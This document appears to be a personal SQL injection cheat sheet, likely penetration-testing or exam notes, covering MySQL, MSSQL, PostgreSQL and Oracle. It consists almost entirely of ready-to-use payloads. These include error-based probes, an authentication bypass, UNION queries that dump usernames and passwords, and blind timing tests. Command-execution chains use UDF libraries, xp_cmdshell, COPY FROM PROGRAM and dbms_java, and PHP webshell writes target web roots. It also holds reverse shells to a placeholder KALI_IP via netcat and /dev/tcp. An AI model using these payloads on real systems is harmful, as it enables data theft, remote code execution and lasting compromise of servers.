# ***Test/LHF***

| DBMS                 | Example Error Message                                                                     | Example Payload |
| -------------------- | ----------------------------------------------------------------------------------------- | --------------- |
| MySQL                | `You have an error in your SQL syntax; ... near '' at line 1`                             | `'`             |
| PostgreSQL           | `ERROR: unterminated quoted string at or near "'"`                                        | `'`             |
| PostgreSQL           | `ERROR: syntax error at or near "1"`                                                      | `1'`            |
| Microsoft SQL Server | `Unclosed quotation mark after the character string ''.`                                  | `'`             |
| Microsoft SQL Server | `Incorrect syntax near ''.`                                                               | `'`             |
| Microsoft SQL Server | `The conversion of the varchar value to data type int resulted in an out-of-range value.` | `1'`            |
| Oracle               | `ORA-00933: SQL command not properly ended`                                               | `'`             |
| Oracle               | `ORA-01756: quoted string not properly terminated`                                        | `'`             |
| Oracle               | `ORA-00923: FROM keyword not found where expected`                                        | `1'`            |
## version test to confirm
```
#####
# M #
#####
' OR 1 in (select @@version) --//
```

```
#####
# S #
#####
' OR 1=cast(@@version as int) --//
' OR 1 in (SELECT cast(@@version as int)) --//
' OR 1 in (SELECT convert(int, @@version)) --//
```

```
#####
# P #
#####
' OR 1 in (select version()) --//
```

```
#####
# O #
#####
' || (SELECT version FROM v$instance WHERE rownum=1)--
' || (SELECT 1/0 FROM v$version WHERE rownum=1) --
' || (SELECT DBMS_UTILITY.DB_VERSION FROM dual)--
```
## Auth bypass
```
######
# My #
######
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') --//
```
## RCE
```
############
# My (UDF) #
############
# A) mysqludf from git
########################
git clone https://github.com/mysqludf/lib_mysqludf_sys.git
cd lib_mysqludf_sys
make
xxd -p lib_mysqludf_sys.so | tr -d '\n' > udf_hex.txt

'; SELECT 0x<hex_of_udf_binary> INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';SELECT sys_exec('PAYLOAD'); --

# B) raptor_udf2.so
#####################
'; create table foo(line blob); insert into foo values(load_file('/tmp/raptor_udf2.so')); 
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so'; 
create function do_system returns integer soname 'raptor_udf2.so'; --//
```

```
######
# MS #
######
';EXECUTE sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXECUTE xp_cmdshell 'COMMAND'; --//
```

```
#####
# P #
#####
DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'nc KALI_IP 443 -e /bin/bash'; --//
```

```
#####
# O #
#####
'; BEGIN dbms_java.runjava('java.lang.Runtime.getRuntime().exec("/bin/bash -c ''/bin/bash -i >& /dev/tcp/KALI_IP/443 0>&1''")'); EXCEPTION WHEN OTHERS THEN NULL; END; --//
```
## Write to File
```
######
# My #
######
'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; --//
'; SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'; --//

# If different webroot enumerate using UNION and rerun above queries
' UNION SELECT 1, ... LOAD_FILE('/var/www/html/index.php') ... --// 
' UNION SELECT 1, ... LOAD_FILE('/var/www/index.html') ... --//
' UNION SELECT 1, ... LOAD_FILE('/usr/share/nginx/html/index.php') ... --//

' UNION SELECT 1, ... LOAD_FILE('C:/inetpub/wwwroot/index.php') ... --//
' UNION SELECT 1, ... LOAD_FILE('C:/xampp/htdocs/index.php') ... --//
' UNION SELECT 1, ... LOAD_FILE('D:/htdocs/index.html') ... --//
```

```
######
# MS #
######
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --//
'; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ^> > C:\inetpub\wwwroot\shell.php'; --//
```

```
#####
# P #
#####
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'; --//
```

```
#####
# O #
#####
'; BEGIN dbms_java.runjava('oracle/aurora/util/Wrapper', 'echo', '<?php system($_GET["cmd"]); ?> > /u01/app/oracle/product/11.2.0/xe/app/oracle/shell.php'); END; --//
```


# ***Union Payloads***
***If errors show and no LHF, find # of columns (the types must also be the same across columns)***
## 1 find valid number of columns
```
#####################
# 1 ORDER BY method #
#####################
' ORDER BY 1 --//
' ORDER BY 2 --//
' ORDER BY 3 --//
' ORDER BY 4 --// # If this ERRORS it means Query is only using 3 columns
' ORDER BY ... --//

' ORDER BY 1,2,3,4,5,6,7,8,...
```

```
#####################
# 2 GROUP BY method #
#####################
' GROUP BY 1,2,3,4,5,6,7,8,... --//
```

```
#########################
# 3 UNION SELECT method #
#########################
1' UNION SELECT @ --//      # will error; The used SELECT statements have a different number of columns
1' UNION SELECT @,@ --//    # will error; The used SELECT statements have a different number of columns
1' UNION SELECT @,@,@ --//  # NO ERROR;here means query uses 3 column
```

```
##################
# 4 ERROR method #
##################
# M
#####
' OR 1 in (select * FROM information_schema.tables) --//

# S
#####
' OR 1=(SELECT * FROM master.dbo.sysdatabases) --//
```
## 2 Enum to Test
```
######
# My #
######
# current DB, USER, VERSION
' union select null, database(), user(), @@version, null, null, ... --//

# dump TABLES w/ COLUMNS (remove WHERE for all dbs)
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() --//

# dump Specific Table
' UNION SELECT null, username, password, description, null FROM users --//
```

```
######
# MS #
######
# current DB, USER, VERSION
' union select null, db_name(), user_name(), @@version, null, null, ... --//

# dump TABLES w/ COLUMNS (remove WEHERE for all dbs)
' union select null, table_name, column_name, table_schema null from information_schema.columns where table_schema=db_name() --//

# dump Specific Table
' UNION SELECT null, username, password, description, null FROM users --//
```

```
#####
# P #
#####
# current DB, USER, VERSION
' union select null, current_database(), current_user, version(), null, null, ... --//

# dump TABLES w/ COLUMNS (remove WHERE for all dbs)
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=current_database() --//

# dump Specific Table
' UNION SELECT null, username, password, description, null FROM users --//
```

```
#####
# O #
#####
# current DB, USER, VERSION
' union select null, SYS_CONTEXT('USERENV', 'DB_NAME'), user, VERSIONS('Oracle'), null, null, ... --//

# dump TABLES w/ COLUMNS (use FROM all_tab_columns for all sbs)
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=SYS_CONTEXT('USERENV', 'DB_NAME') --//

# dump Specific Table
' UNION SELECT null, username, password, description, null FROM users --//
```
## A) Union based RCE
```
######
# My #
######
' UNION SELECT NULL, NULL, sys_exec('id > /tmp/mysql_output.txt') --//
' UNION SELECT NULL, NULL, LOAD_FILE('/tmp/mysql_output.txt') --//
```

```
######
# MS #
######
' UNION SELECT null, null, cast((EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;) AS NVARCHAR(4000)) --//
' UNION SELECT null, null, CAST(xp_cmdshell('dir') AS NVARCHAR(4000)) --// 
' UNION SELECT null, null, CAST(xp_cmdshell('PAYLOAD') AS NVARCHAR(4000)) --//
```

```
#####
# P # (REQUIRES SUPER)
#####
' UNION SELECT NULL, NULL, COPY (SELECT 'id') TO PROGRAM 'id > /tmp/output.txt' --//
' UNION SELECT NULL, NULL, pg_read_file('/tmp/output.txt', 0, 100) --//
```

```
#####
# O #
#####
' UNION SELECT null, null, dbms_java.runjava('java.lang.Runtime.getRuntime().exec("id > /tmp/oracle_output.txt")') FROM dual --//
' UNION SELECT null, null, utl_file.fread('/tmp', 'oracle_output.txt') FROM dual --//
```
## B) Write to File
```
######
# My # (webshell write)
######
' UNION SELECT null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE "/var/www/html/tmp/webshell.php" --//
select null, null, "<?php echo shell_exec($_GET['cmd']);?>", null into OUTFILE 'C:/xampp/htdocs/back.php' --//
```

```
######
# MS #
######
' UNION SELECT null, null, cast((EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ^> > C:\inetpub\wwwroot\shell.php';) AS NVARCHAR(4000)), null --//
```

```
#####
# P #
#####
' UNION SELECT null, null, '<?php system($_GET["cmd"]); ?>', null INTO OUTFILE '/var/www/html/shell.php'; --//
```
***Hit the webshell***
```
curl -k http://`tip`:`WPORT`/tmp/webshell.php?cmd=url_encoded_reverse_shell_payload
```

# *Blind*
***UNLIKELY*** to appear but just incase, use below to test
## test
```
######
# My #
######
' OR 1=1 --// True condition
' OR 1=2 --// False condition

' OR IF(1=1, SLEEP(5), 0) --// True - causes a delay
' OR IF(1=2, SLEEP(5), 0) --// False - no delay
```

```
######
# MS #
######
' OR 1=1 --// -- True condition
' OR 1=2 --// -- False condition

' IF(1=1) WAITFOR DELAY '0:0:5' --//   -- True - causes a delay
' IF(1=2) WAITFOR DELAY '0:0:5' --//   -- False - no delay
```

```
#####
# P #
#####
' OR 1=1 --//   -- True condition
' OR 1=2 --//   -- False condition

' OR (SELECT pg_sleep(5) WHERE 1=1); --//  -- True - causes a delay
' OR (SELECT pg_sleep(5) WHERE 1=2); --//  -- False - no delay
```

```
#####
# O #
#####
' OR 1=1 --//   -- True condition
' OR 1=2 --//  -- False condition

' OR 1=CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END --//   -- True - delay
' OR 1=CASE WHEN (1=2) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END --//   -- False - no delay
```
## If success try the multi-statement RCE first (then others if it fails etc etc)

# *resources*
```
saved sql tabs
```